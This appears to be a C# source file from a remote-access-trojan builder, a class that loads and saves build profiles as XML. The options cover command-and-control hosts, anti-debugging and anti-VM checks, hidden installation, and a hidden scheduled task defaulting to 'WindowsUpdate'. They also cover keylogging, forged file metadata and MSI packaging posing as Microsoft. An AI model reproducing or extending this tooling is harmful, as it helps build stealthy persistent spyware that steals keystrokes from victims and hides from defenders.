using System.Xml.Linq;
using mullvad.Build;

namespace mullvad.Models
{
    public class BuilderProfile
    {
        public string Name { get; set; } = "Default";

        private static string ProfileDir =>
            Path.Combine(AppContext.BaseDirectory, "Profiles");

        private static string ProfilePath(string name) =>
            Path.Combine(ProfileDir, name + ".xml");

        public static BuilderProfile Load(string name = "Default")
        {
            var path = ProfilePath(name);
            if (!File.Exists(path)) return new BuilderProfile { Name = name };

            try
            {
                var doc = XDocument.Load(path);
                var r   = doc.Root!;
                var p   = new BuilderProfile { Name = name };
                return p;
            }
            catch { return new BuilderProfile { Name = name }; }
        }

        public static BuildOptions LoadOptions(string name = "Default")
        {
            var path = ProfilePath(name);
            if (!File.Exists(path)) return new BuildOptions();

            try
            {
                var doc = XDocument.Load(path);
                var r   = doc.Root!;
                var opt = new BuildOptions();

                string? Get(string key) => r.Element(key)?.Value;
                bool    GetBool(string key) => Get(key) == "true";
                int     GetInt(string key, int def = 0)
                    => int.TryParse(Get(key), out var v) ? v : def;

                var hostsRaw = Get("Hosts") ?? "127.0.0.1";
                opt.Hosts = hostsRaw.Split('|', StringSplitOptions.RemoveEmptyEntries).ToList();
                if (opt.Hosts.Count == 0) opt.Hosts.Add("127.0.0.1");

                opt.Port           = GetInt("Port", 7777);
                opt.ReconnectDelay = GetInt("ReconnectDelay", 5000);
                opt.Tag            = Get("Tag")   ?? "Mole";
                opt.Mutex          = Get("Mutex") ?? "mullvad_default_mutex";
                opt.RequireAdmin   = GetBool("RequireAdmin");
                opt.DebugConsole   = GetBool("DebugConsole");
                opt.AntiDebug      = GetBool("AntiDebug");
                opt.AntiTamper     = GetBool("AntiTamper");
                opt.AntiVirtual    = GetBool("AntiVirtual");
                opt.Obfuscation    = GetBool("Obfuscation");
                opt.Encrypted      = GetBool("Encrypted");
                opt.NativeAot      = Get("NativeAot") == null || GetBool("NativeAot");
                opt.Install                = GetBool("Install");
                opt.InstallPath            = GetInt("InstallPath", 1);
                opt.InstallSubDirectory    = Get("InstallSubDirectory") ?? "mullvad";
                opt.InstallName            = Get("InstallName") ?? "client";
                opt.HideFile               = GetBool("HideFile");
                opt.HideSubDirectory       = GetBool("HideSubDirectory");
                opt.Startup                = GetBool("Startup");
                opt.StartupName            = Get("StartupName") ?? "mullvad";
                opt.UseTaskScheduler       = GetBool("UseTaskScheduler");
                opt.TaskName               = Get("TaskName") ?? "WindowsUpdate";
                opt.TaskTrigger            = GetInt("TaskTrigger", 0);
                opt.TaskIntervalMinutes    = GetInt("TaskIntervalMinutes", 30);
                opt.TaskHighestPrivileges  = GetBool("TaskHighestPrivileges");
                opt.TaskLoggedOffRun       = GetBool("TaskLoggedOffRun");
                opt.TaskHidden             = GetBool("TaskHidden");
                opt.TaskRestartOnFailure   = GetBool("TaskRestartOnFailure");
                opt.Keylogger              = GetBool("Keylogger");
                opt.LogDirectoryName       = Get("LogDirectoryName") ?? "Logs";
                opt.HideLogDirectory       = GetBool("HideLogDirectory");
                opt.ChangeAsmInfo          = GetBool("ChangeAsmInfo");
                opt.ProductName            = Get("ProductName") ?? "";
                opt.Description            = Get("Description") ?? "";
                opt.CompanyName            = Get("CompanyName") ?? "";
                opt.Copyright              = Get("Copyright") ?? "";
                opt.Trademarks             = Get("Trademarks") ?? "";
                opt.OriginalFilename       = Get("OriginalFilename") ?? "";
                opt.ProductVersion         = Get("ProductVersion") ?? "1.0.0.0";
                opt.FileVersion            = Get("FileVersion") ?? "1.0.0.0";
                opt.ChangeIcon             = GetBool("ChangeIcon");
                opt.IconPath               = Get("IconPath") ?? "";
                opt.MsiProductName         = Get("MsiProductName") ?? "Windows Service";
                opt.MsiManufacturer        = Get("MsiManufacturer") ?? "Microsoft";
                opt.MsiAutoRun             = Get("MsiAutoRun") == null || GetBool("MsiAutoRun");
                return opt;
            }
            catch { return new BuildOptions(); }
        }

        public static void Save(BuildOptions opt, string name = "Default")
        {
            try
            {
                Directory.CreateDirectory(ProfileDir);
                var doc = new XDocument(new XElement("settings",
                    new XElement("Hosts",              string.Join("|", opt.Hosts)),
                    new XElement("Port",               opt.Port),
                    new XElement("ReconnectDelay",     opt.ReconnectDelay),
                    new XElement("Tag",                opt.Tag),
                    new XElement("Mutex",              opt.Mutex),
                    new XElement("RequireAdmin",       opt.RequireAdmin),
                    new XElement("DebugConsole",       opt.DebugConsole),
                    new XElement("AntiDebug",          opt.AntiDebug),
                    new XElement("AntiTamper",         opt.AntiTamper),
                    new XElement("AntiVirtual",        opt.AntiVirtual),
                    new XElement("Obfuscation",        opt.Obfuscation),
                    new XElement("Encrypted",          opt.Encrypted),
                    new XElement("NativeAot",          opt.NativeAot),
                    new XElement("Install",            opt.Install),
                    new XElement("InstallPath",        opt.InstallPath),
                    new XElement("InstallSubDirectory",opt.InstallSubDirectory),
                    new XElement("InstallName",        opt.InstallName),
                    new XElement("HideFile",           opt.HideFile),
                    new XElement("HideSubDirectory",   opt.HideSubDirectory),
                    new XElement("Startup",            opt.Startup),
                    new XElement("StartupName",        opt.StartupName),
                    new XElement("UseTaskScheduler",      opt.UseTaskScheduler),
                    new XElement("TaskName",              opt.TaskName),
                    new XElement("TaskTrigger",           opt.TaskTrigger),
                    new XElement("TaskIntervalMinutes",   opt.TaskIntervalMinutes),
                    new XElement("TaskHighestPrivileges", opt.TaskHighestPrivileges),
                    new XElement("TaskLoggedOffRun",      opt.TaskLoggedOffRun),
                    new XElement("TaskHidden",            opt.TaskHidden),
                    new XElement("TaskRestartOnFailure",  opt.TaskRestartOnFailure),
                    new XElement("Keylogger",             opt.Keylogger),
                    new XElement("LogDirectoryName",   opt.LogDirectoryName),
                    new XElement("HideLogDirectory",   opt.HideLogDirectory),
                    new XElement("ChangeAsmInfo",      opt.ChangeAsmInfo),
                    new XElement("ProductName",        opt.ProductName),
                    new XElement("Description",        opt.Description),
                    new XElement("CompanyName",        opt.CompanyName),
                    new XElement("Copyright",          opt.Copyright),
                    new XElement("Trademarks",         opt.Trademarks),
                    new XElement("OriginalFilename",   opt.OriginalFilename),
                    new XElement("ProductVersion",     opt.ProductVersion),
                    new XElement("FileVersion",        opt.FileVersion),
                    new XElement("ChangeIcon",         opt.ChangeIcon),
                    new XElement("IconPath",           opt.IconPath),
                    new XElement("MsiProductName",     opt.MsiProductName),
                    new XElement("MsiManufacturer",    opt.MsiManufacturer),
                    new XElement("MsiAutoRun",         opt.MsiAutoRun)
                ));
                doc.Save(ProfilePath(name));
            }
            catch { }
        }
    }
}
